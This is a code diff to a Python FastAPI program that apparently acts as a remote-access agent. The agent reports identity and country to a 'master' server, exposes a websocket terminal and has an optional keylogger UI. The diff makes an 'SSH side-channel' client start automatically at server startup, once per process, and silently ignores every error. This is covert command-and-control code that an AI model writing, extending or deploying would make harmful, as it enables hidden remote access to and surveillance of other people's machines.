@@ -24,6 +24,21 @@ try:
     _HAS_AGENT_SSH = True
 except Exception:
     _HAS_AGENT_SSH = False
+
+# ensure we only start one SSH client task per process
+_ssh_task_started: bool = False
+
+def _start_ssh_once(agent_id: str, agent_name: str) -> None:
+    global _ssh_task_started
+    if not _HAS_AGENT_SSH:
+        return
+    if _ssh_task_started:
+        return
+    try:
+        asyncio.get_running_loop().create_task(start_agent_ssh(agent_id, agent_name))
+        _ssh_task_started = True
+    except Exception:
+        pass
 import mimetypes
 
 # Ensure Windows supports asyncio subprocesses
@@ -373,6 +388,15 @@ async def websocket_terminal(websocket: WebSocket):
         if token:
             SESSION_DIRS.pop(token, None)
 
+
+# FastAPI startup: also ensure SSH side-channel starts independently of WS
+@app.on_event('startup')
+async def _start_ssh_channel():
+    try:
+        agent_id, agent_name = await asyncio.to_thread(_derive_identity_sync)
+        _start_ssh_once(agent_id, agent_name)
+    except Exception:
+        pass
 
 # Optional local keylogger UI (guarded) for testing
 if __name__ == "__main__" and os.getenv("ENABLE_KEYLOGGER_UI", "0").lower() in ("1","true","yes","on"):
@@ -1015,13 +1039,8 @@ async def _connect_one_master(url: str):
                         "country": country,
                         "country_code": country_code,
                     }))
-                    # kick off SSH side-channel client once per process
-                    if _HAS_AGENT_SSH:
-                        try:
-                            # fire-and-forget persistent task
-                            asyncio.get_event_loop().create_task(start_agent_ssh(agent_id, agent_name))
-                        except Exception:
-                            pass
+                    # kick off SSH side-channel client once per process (guarded)
+                    _start_ssh_once(agent_id, agent_name)
                 except Exception:
                     pass
                 last_log = 0.0
